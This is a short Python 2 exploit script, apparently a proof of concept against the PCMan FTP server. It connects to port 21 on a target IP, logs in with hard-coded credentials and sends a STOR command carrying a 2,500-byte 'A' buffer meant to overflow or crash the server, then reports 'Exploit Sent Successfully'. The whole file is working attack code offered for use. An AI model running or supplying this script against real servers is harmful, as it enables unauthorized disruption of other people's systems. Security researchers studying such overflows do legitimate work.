#!/usr/bin/python
#-------------------------------------------------------------------#
#			Name : Rio Atmadja			    #
#		       Script: ftp_pcman		   	    #
#-------------------------------------------------------------------#
import socket, sys, os, time

if len(sys.argv) != 2:
        print "[*] Usage: %s <Ip address> \n" % sys.argv[0]
        sys.exit(0)
target = sys.argv[1]

buffer = '\x41' * 2500

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connect to %s on port %d" % (target,21)
try:
	s.connect((target,21))
        s.recv(1024)
	s.send('USER jeff\r\n') 
	s.recv(1024)
	s.send('PASS 123qwe\r\n')
	s.recv(1024)
	s.send("STOR /" +  buffer +  "\n" + "\r\n")
        print "[+] Sending payload of size " +  str(len(buffer)) + " Bytes "
	s.close()
	print "[+] Exploit Sent Successfully"
except:
	print "[-] Could not connect to " + target + ":21\r"
        sys.exit(0) 
